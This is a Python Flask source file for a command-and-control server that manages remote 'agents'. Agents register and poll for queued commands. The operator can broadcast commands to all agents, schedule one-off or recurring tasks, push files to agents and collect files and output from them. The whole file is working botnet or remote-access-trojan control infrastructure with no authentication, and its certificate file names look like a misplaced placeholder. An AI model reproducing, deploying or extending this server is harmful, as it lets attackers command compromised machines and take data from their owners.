### Requires valid cert for HTTPS

from flask import Flask, request, jsonify, render_template, send_file
import uuid
import time
import os
from collections import deque
import threading
import sqlite3
import json
from datetime import datetime, timedelta
import schedule
import atexit
from werkzeug.utils import secure_filename

app = Flask(__name__)

# Configuration
UPLOAD_FOLDER = 'uploads'
DOWNLOAD_FOLDER = 'downloads'
MAX_FILE_SIZE = 100 * 1024 * 1024  # 100MB
SCHEDULER_INTERVAL = 60  # seconds

os.makedirs(UPLOAD_FOLDER, exist_ok=True)
os.makedirs(DOWNLOAD_FOLDER, exist_ok=True)

# Database setup with connection pooling
class DBConnectionPool:
    def __init__(self, max_connections=10):
        self.max_connections = max_connections
        self.pool = deque(maxlen=max_connections)
        self.lock = threading.Lock()
        
    def get_connection(self):
        with self.lock:
            if self.pool:
                return self.pool.pop()
            else:
                conn = sqlite3.connect('c2.db', timeout=10, check_same_thread=False)
                conn.row_factory = sqlite3.Row
                return conn
                
    def return_connection(self, conn):
        with self.lock:
            if len(self.pool) < self.max_connections:
                self.pool.append(conn)
            else:
                conn.close()

db_pool = DBConnectionPool(max_connections=20)

def init_db():
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute('''CREATE TABLE IF NOT EXISTS agents
                     (id TEXT PRIMARY KEY, ip TEXT, info TEXT, last_seen REAL, active INTEGER, 
                      reconnect_attempts INTEGER DEFAULT 0, last_reconnect REAL)''')
        c.execute('''CREATE TABLE IF NOT EXISTS commands
                     (id INTEGER PRIMARY KEY AUTOINCREMENT, 
                      agent_id TEXT, command TEXT, timestamp REAL, 
                      is_file INTEGER DEFAULT 0, file_path TEXT, 
                      is_scheduled INTEGER DEFAULT 0, scheduled_time REAL,
                      is_recurring INTEGER DEFAULT 0, interval_seconds INTEGER)''')
        c.execute('''CREATE TABLE IF NOT EXISTS results
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      agent_id TEXT, output TEXT, timestamp REAL,
                      is_file INTEGER DEFAULT 0, file_path TEXT)''')
        c.execute('''CREATE TABLE IF NOT EXISTS files
                     (id INTEGER PRIMARY KEY AUTOINCREMENT,
                      agent_id TEXT, filename TEXT, filepath TEXT,
                      size INTEGER, upload_time REAL, direction TEXT)''')
        conn.commit()
    finally:
        db_pool.return_connection(conn)

init_db()

# In-memory caches for performance
active_agents = set()
command_queue = {}
result_cache = deque(maxlen=1000)  # Keep recent 1000 results in memory

# Scheduler thread
def run_scheduled_tasks():
    while True:
        schedule.run_pending()
        time.sleep(SCHEDULER_INTERVAL)

scheduler_thread = threading.Thread(target=run_scheduled_tasks, daemon=True)
scheduler_thread.start()

# Cleanup thread
def cleanup_agents():
    while True:
        time.sleep(60)
        cutoff = time.time() - 300  # 5 minutes
        try:
            conn = db_pool.get_connection()
            c = conn.cursor()
            
            # Mark inactive agents
            c.execute("UPDATE agents SET active = 0 WHERE last_seen < ?", (cutoff,))
            
            # Handle auto-reconnect for inactive agents
            c.execute("""UPDATE agents 
                        SET reconnect_attempts = reconnect_attempts + 1, 
                            last_reconnect = ?
                        WHERE active = 0 AND last_seen < ?""", 
                     (time.time(), cutoff))
            
            # Reset reconnect attempts if agent came back
            c.execute("""UPDATE agents 
                        SET reconnect_attempts = 0 
                        WHERE active = 1 AND reconnect_attempts > 0""")
            
            conn.commit()
            
            # Update active agents cache
            active = c.execute("SELECT id FROM agents WHERE active = 1").fetchall()
            active_agents.clear()
            active_agents.update(a['id'] for a in active)
            
            # Clean up old results (older than 7 days)
            week_ago = time.time() - (7 * 24 * 3600)
            c.execute("DELETE FROM results WHERE timestamp < ?", (week_ago,))
            
            # Clean up old files records
            c.execute("DELETE FROM files WHERE upload_time < ?", (week_ago,))
            
            conn.commit()
        except Exception as e:
            print(f"Cleanup error: {e}")
        finally:
            db_pool.return_connection(conn)

cleanup_thread = threading.Thread(target=cleanup_agents, daemon=True)
cleanup_thread.start()

# File management
def save_uploaded_file(file, agent_id):
    filename = secure_filename(file.filename)
    filepath = os.path.join(UPLOAD_FOLDER, f"{agent_id}_{int(time.time())}_{filename}")
    file.save(filepath)
    
    # Record file upload in database
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute("""INSERT INTO files 
                    (agent_id, filename, filepath, size, upload_time, direction)
                    VALUES (?, ?, ?, ?, ?, ?)""",
                 (agent_id, filename, filepath, os.path.getsize(filepath), 
                  time.time(), 'upload'))
        conn.commit()
    finally:
        db_pool.return_connection(conn)
    
    return filepath

def record_downloaded_file(agent_id, filename, filepath):
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute("""INSERT INTO files 
                    (agent_id, filename, filepath, size, upload_time, direction)
                    VALUES (?, ?, ?, ?, ?, ?)""",
                 (agent_id, filename, filepath, os.path.getsize(filepath), 
                  time.time(), 'download'))
        conn.commit()
    finally:
        db_pool.return_connection(conn)

# Scheduled tasks
def schedule_recurring_command(agent_id, command, interval_seconds):
    def job():
        conn = db_pool.get_connection()
        try:
            c = conn.cursor()
            c.execute("""INSERT INTO commands 
                        (agent_id, command, timestamp, is_scheduled, is_recurring, interval_seconds)
                        VALUES (?, ?, ?, 1, 1, ?)""",
                     (agent_id, command, time.time(), interval_seconds))
            conn.commit()
        finally:
            db_pool.return_connection(conn)
    
    schedule.every(interval_seconds).seconds.do(job)
    return job

# API Endpoints
@app.route('/')
def dashboard():
    return render_template('developc2.html')

@app.route('/register', methods=['POST'])
def register():
    data = request.json
    agent_id = str(uuid.uuid4())
    ip = request.remote_addr
    info = data.get('info', '')
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute("""INSERT INTO agents 
                     (id, ip, info, last_seen, active, reconnect_attempts, last_reconnect)
                     VALUES (?, ?, ?, ?, 1, 0, ?)""",
                  (agent_id, ip, info, time.time(), time.time()))
        conn.commit()
    finally:
        db_pool.return_connection(conn)
    
    active_agents.add(agent_id)
    print(f"[+] Agent registered: {agent_id} from {ip}")
    return jsonify({'agent_id': agent_id})

@app.route('/checkin/<agent_id>', methods=['GET'])
def checkin(agent_id):
    # Update last seen time
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute("UPDATE agents SET last_seen = ?, active = 1 WHERE id = ?", 
                  (time.time(), agent_id))
        
        # Get pending command
        command = c.execute("""SELECT id, command, is_file, file_path 
                              FROM commands 
                              WHERE agent_id = ? 
                              ORDER BY id ASC LIMIT 1""", 
                           (agent_id,)).fetchone()
        
        if command:
            c.execute("DELETE FROM commands WHERE id = ?", (command['id'],))
            conn.commit()
            
            if command['is_file']:
                # For file commands, send the file path
                response = {
                    'command': command['command'],
                    'is_file': True,
                    'file_path': command['file_path']
                }
            else:
                response = {
                    'command': command['command'],
                    'is_file': False
                }
        else:
            response = {'command': ''}
            
        conn.commit()
    finally:
        db_pool.return_connection(conn)
    
    if agent_id not in active_agents:
        active_agents.add(agent_id)
    
    return jsonify(response)

@app.route('/result/<agent_id>', methods=['POST'])
def result(agent_id):
    output = request.json.get('output', '')
    is_file = request.json.get('is_file', False)
    file = request.files.get('file') if is_file else None
    timestamp = time.time()
    
    file_path = None
    if is_file and file:
        filename = secure_filename(file.filename)
        file_path = os.path.join(DOWNLOAD_FOLDER, f"{agent_id}_{int(time.time())}_{filename}")
        file.save(file_path)
        record_downloaded_file(agent_id, filename, file_path)
    
    # Store in database
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute("""INSERT INTO results 
                    (agent_id, output, timestamp, is_file, file_path)
                    VALUES (?, ?, ?, ?, ?)""",
                 (agent_id, output, timestamp, 1 if is_file else 0, file_path))
        conn.commit()
    finally:
        db_pool.return_connection(conn)
    
    # Cache recent result
    result_cache.append({
        'agent_id': agent_id,
        'output': output,
        'timestamp': timestamp,
        'is_file': is_file,
        'file_path': file_path
    })
    
    print(f"[+] Result from {agent_id}: {output[:50]}...")
    return jsonify({'status': 'received'})

@app.route('/command/<agent_id>', methods=['POST'])
def send_command(agent_id):
    cmd = request.json.get('command', '')
    is_file = request.json.get('is_file', False)
    file = request.files.get('file') if is_file else None
    
    if not cmd and not is_file:
        return jsonify({'error': 'No command or file provided'}), 400
    
    file_path = None
    if is_file and file:
        if file.content_length > MAX_FILE_SIZE:
            return jsonify({'error': 'File too large'}), 413
        file_path = save_uploaded_file(file, agent_id)
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        c.execute("""INSERT INTO commands 
                    (agent_id, command, timestamp, is_file, file_path)
                    VALUES (?, ?, ?, ?, ?)""",
                 (agent_id, cmd, time.time(), 1 if is_file else 0, file_path))
        conn.commit()
    finally:
        db_pool.return_connection(conn)
    
    return jsonify({'status': f'Command queued for {agent_id}'})

@app.route('/command_all', methods=['POST'])
def send_to_all():
    cmd = request.json.get('command', '')
    is_file = request.json.get('is_file', False)
    file = request.files.get('file') if is_file else None
    
    if not cmd and not is_file:
        return jsonify({'error': 'No command or file provided'}), 400
    
    file_path = None
    if is_file and file:
        if file.content_length > MAX_FILE_SIZE:
            return jsonify({'error': 'File too large'}), 413
        
        # Save file once and share path with all agents
        temp_filename = f"broadcast_{int(time.time())}_{secure_filename(file.filename)}"
        file_path = os.path.join(UPLOAD_FOLDER, temp_filename)
        file.save(file_path)
    
    timestamp = time.time()
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        # Get all active agents
        agents = c.execute("SELECT id FROM agents WHERE active = 1").fetchall()
        
        # Queue command for each agent
        for agent in agents:
            c.execute("""INSERT INTO commands 
                        (agent_id, command, timestamp, is_file, file_path)
                        VALUES (?, ?, ?, ?, ?)""",
                     (agent['id'], cmd, timestamp, 1 if is_file else 0, file_path))
        
        conn.commit()
    finally:
        db_pool.return_connection(conn)
    
    return jsonify({
        'status': f'Command sent to {len(agents)} agents',
        'count': len(agents)
    })

@app.route('/schedule/<agent_id>', methods=['POST'])
def schedule_command(agent_id):
    cmd = request.json.get('command', '')
    schedule_time = request.json.get('time', None)
    is_recurring = request.json.get('is_recurring', False)
    interval_seconds = request.json.get('interval_seconds', 3600)
    
    if not cmd:
        return jsonify({'error': 'No command provided'}), 400
    
    if not schedule_time and not is_recurring:
        return jsonify({'error': 'No schedule time provided'}), 400
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        if is_recurring:
            # Schedule recurring command
            job = schedule_recurring_command(agent_id, cmd, interval_seconds)
            scheduled_time = time.time() + interval_seconds
            
            c.execute("""INSERT INTO commands 
                        (agent_id, command, timestamp, is_scheduled, is_recurring, interval_seconds)
                        VALUES (?, ?, ?, 1, 1, ?)""",
                     (agent_id, cmd, scheduled_time, interval_seconds))
            
            response = {
                'status': f'Recurring command scheduled every {interval_seconds} seconds for {agent_id}',
                'interval': interval_seconds
            }
        else:
            # Schedule one-time command
            try:
                scheduled_time = datetime.strptime(schedule_time, '%Y-%m-%d %H:%M:%S').timestamp()
            except ValueError:
                return jsonify({'error': 'Invalid time format. Use YYYY-MM-DD HH:MM:SS'}), 400
            
            if scheduled_time < time.time():
                return jsonify({'error': 'Schedule time must be in the future'}), 400
                
            c.execute("""INSERT INTO commands 
                        (agent_id, command, timestamp, is_scheduled, scheduled_time)
                        VALUES (?, ?, ?, 1, ?)""",
                     (agent_id, cmd, scheduled_time, scheduled_time))
            
            # Schedule the job
            def job():
                conn = db_pool.get_connection()
                try:
                    c = conn.cursor()
                    c.execute("""INSERT INTO commands 
                                (agent_id, command, timestamp)
                                VALUES (?, ?, ?)""",
                             (agent_id, cmd, time.time()))
                    conn.commit()
                finally:
                    db_pool.return_connection(conn)
            
            schedule_time_datetime = datetime.fromtimestamp(scheduled_time)
            schedule.every().day.at(schedule_time_datetime.strftime('%H:%M')).do(job)
            
            response = {
                'status': f'Command scheduled for {schedule_time} for {agent_id}',
                'scheduled_time': schedule_time
            }
        
        conn.commit()
    finally:
        db_pool.return_connection(conn)
    
    return jsonify(response)

@app.route('/download/<int:file_id>', methods=['GET'])
def download_file(file_id):
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        file_info = c.execute("""SELECT filepath, filename FROM files 
                               WHERE id = ? AND direction = 'download'""",
                            (file_id,)).fetchone()
        
        if not file_info:
            return jsonify({'error': 'File not found'}), 404
            
        return send_file(file_info['filepath'], as_attachment=True, download_name=file_info['filename'])
    finally:
        db_pool.return_connection(conn)

# API endpoints for dashboard data
@app.route('/api/agents', methods=['GET'])
def get_agents():
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 20))
    offset = (page - 1) * per_page
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        # Get paginated agents
        c.execute("""SELECT id, ip, info, last_seen, reconnect_attempts, last_reconnect 
                    FROM agents WHERE active = 1 
                    ORDER BY last_seen DESC LIMIT ? OFFSET ?""", 
                 (per_page, offset))
        agents = [{
            'id': row['id'],
            'ip': row['ip'],
            'info': row['info'],
            'last_seen': row['last_seen'],
            'last_seen_human': datetime.fromtimestamp(row['last_seen']).strftime('%Y-%m-%d %H:%M:%S'),
            'reconnect_attempts': row['reconnect_attempts'],
            'last_reconnect': datetime.fromtimestamp(row['last_reconnect']).strftime('%Y-%m-%d %H:%M:%S') if row['last_reconnect'] else None
        } for row in c.fetchall()]
        
        # Get total count
        total = c.execute("SELECT COUNT(*) FROM agents WHERE active = 1").fetchone()[0]
        
        return jsonify({
            'agents': agents,
            'total': total,
            'page': page,
            'per_page': per_page,
            'total_pages': (total + per_page - 1) // per_page
        })
    finally:
        db_pool.return_connection(conn)

@app.route('/api/results', methods=['GET'])
def get_results():
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 10))
    offset = (page - 1) * per_page
    agent_id = request.args.get('agent_id', None)
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        query = """SELECT r.id, r.agent_id, a.ip, r.output, r.timestamp, r.is_file, r.file_path 
                  FROM results r JOIN agents a ON r.agent_id = a.id"""
        params = []
        
        if agent_id:
            query += " WHERE r.agent_id = ?"
            params.append(agent_id)
        
        query += " ORDER BY r.timestamp DESC LIMIT ? OFFSET ?"
        params.extend([per_page, offset])
        
        c.execute(query, params)
        results = [{
            'id': row['id'],
            'agent_id': row['agent_id'],
            'ip': row['ip'],
            'output': row['output'],
            'timestamp': row['timestamp'],
            'timestamp_human': datetime.fromtimestamp(row['timestamp']).strftime('%Y-%m-%d %H:%M:%S'),
            'is_file': bool(row['is_file']),
            'file_path': row['file_path'],
            'file_id': row['id'] if bool(row['is_file']) else None
        } for row in c.fetchall()]
        
        # Get total count
        count_query = "SELECT COUNT(*) FROM results"
        if agent_id:
            count_query += " WHERE agent_id = ?"
            c.execute(count_query, (agent_id,))
        else:
            c.execute(count_query)
        
        total = c.fetchone()[0]
        
        return jsonify({
            'results': results,
            'total': total,
            'page': page,
            'per_page': per_page,
            'total_pages': (total + per_page - 1) // per_page
        })
    finally:
        db_pool.return_connection(conn)

@app.route('/api/files', methods=['GET'])
def get_files():
    page = int(request.args.get('page', 1))
    per_page = int(request.args.get('per_page', 10))
    offset = (page - 1) * per_page
    agent_id = request.args.get('agent_id', None)
    direction = request.args.get('direction', None)  # 'upload' or 'download'
    
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        query = """SELECT f.id, f.agent_id, a.ip, f.filename, f.filepath, 
                          f.size, f.upload_time, f.direction
                  FROM files f JOIN agents a ON f.agent_id = a.id"""
        where_clauses = []
        params = []
        
        if agent_id:
            where_clauses.append("f.agent_id = ?")
            params.append(agent_id)
        if direction:
            where_clauses.append("f.direction = ?")
            params.append(direction)
        
        if where_clauses:
            query += " WHERE " + " AND ".join(where_clauses)
        
        query += " ORDER BY f.upload_time DESC LIMIT ? OFFSET ?"
        params.extend([per_page, offset])
        
        c.execute(query, params)
        files = [{
            'id': row['id'],
            'agent_id': row['agent_id'],
            'ip': row['ip'],
            'filename': row['filename'],
            'filepath': row['filepath'],
            'size': row['size'],
            'size_mb': round(row['size'] / (1024 * 1024), 2),
            'upload_time': row['upload_time'],
            'upload_time_human': datetime.fromtimestamp(row['upload_time']).strftime('%Y-%m-%d %H:%M:%S'),
            'direction': row['direction']
        } for row in c.fetchall()]
        
        # Get total count
        count_query = "SELECT COUNT(*) FROM files"
        if where_clauses:
            count_query += " WHERE " + " AND ".join(where_clauses)
        
        c.execute(count_query, params[:-2])  # Remove LIMIT and OFFSET params
        total = c.fetchone()[0]
        
        return jsonify({
            'files': files,
            'total': total,
            'page': page,
            'per_page': per_page,
            'total_pages': (total + per_page - 1) // per_page
        })
    finally:
        db_pool.return_connection(conn)

@app.route('/api/scheduled', methods=['GET'])
def get_scheduled_tasks():
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        c.execute("""SELECT c.id, c.agent_id, a.ip, c.command, c.timestamp, 
                            c.is_recurring, c.interval_seconds, c.scheduled_time
                    FROM commands c JOIN agents a ON c.agent_id = a.id
                    WHERE c.is_scheduled = 1
                    ORDER BY c.scheduled_time ASC""")
        
        tasks = [{
            'id': row['id'],
            'agent_id': row['agent_id'],
            'ip': row['ip'],
            'command': row['command'],
            'timestamp': row['timestamp'],
            'timestamp_human': datetime.fromtimestamp(row['timestamp']).strftime('%Y-%m-%d %H:%M:%S'),
            'is_recurring': bool(row['is_recurring']),
            'interval_seconds': row['interval_seconds'],
            'scheduled_time': row['scheduled_time'],
            'scheduled_time_human': datetime.fromtimestamp(row['scheduled_time']).strftime('%Y-%m-%d %H:%M:%S') if row['scheduled_time'] else None
        } for row in c.fetchall()]
        
        return jsonify({'tasks': tasks})
    finally:
        db_pool.return_connection(conn)

@app.route('/api/stats', methods=['GET'])
def get_stats():
    conn = db_pool.get_connection()
    try:
        c = conn.cursor()
        
        # Active agents count
        active_count = c.execute("SELECT COUNT(*) FROM agents WHERE active = 1").fetchone()[0]
        
        # Recent results count (last hour)
        recent_results = c.execute("SELECT COUNT(*) FROM results WHERE timestamp > ?", 
                                 (time.time() - 3600,)).fetchone()[0]
        
        # Commands pending
        pending_commands = c.execute("SELECT COUNT(*) FROM commands WHERE is_scheduled = 0").fetchone()[0]
        
        # Scheduled tasks count
        scheduled_tasks = c.execute("SELECT COUNT(*) FROM commands WHERE is_scheduled = 1").fetchone()[0]
        
        # File transfer stats
        upload_stats = c.execute("""SELECT COUNT(*) as count, SUM(size) as total_size 
                                  FROM files 
                                  WHERE direction = 'upload' AND upload_time > ?""",
                               (time.time() - 86400,)).fetchone()
        download_stats = c.execute("""SELECT COUNT(*) as count, SUM(size) as total_size 
                                    FROM files 
                                    WHERE direction = 'download' AND upload_time > ?""",
                                 (time.time() - 86400,)).fetchone()
        
        return jsonify({
            'active_agents': active_count,
            'recent_results': recent_results,
            'pending_commands': pending_commands,
            'scheduled_tasks': scheduled_tasks,
            'uploads_last_24h': upload_stats['count'],
            'downloads_last_24h': download_stats['count'],
            'upload_volume_mb': round(upload_stats['total_size'] / (1024 * 1024), 2) if upload_stats['total_size'] else 0,
            'download_volume_mb': round(download_stats['total_size'] / (1024 * 1024), 2) if download_stats['total_size'] else 0,
            'timestamp': time.time()
        })
    finally:
        db_pool.return_connection(conn)

# Clean up on exit
def cleanup():
    print("Cleaning up before exit...")
    # Cancel all scheduled jobs
    schedule.clear()
    # Close all database connections
    while db_pool.pool:
        conn = db_pool.pool.pop()
        conn.close()

atexit.register(cleanup)

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=443, ssl_context=('Requires valid cert for HTTPS.pem', 'Requires valid cert for HTTPSkey.pem'), threaded=True)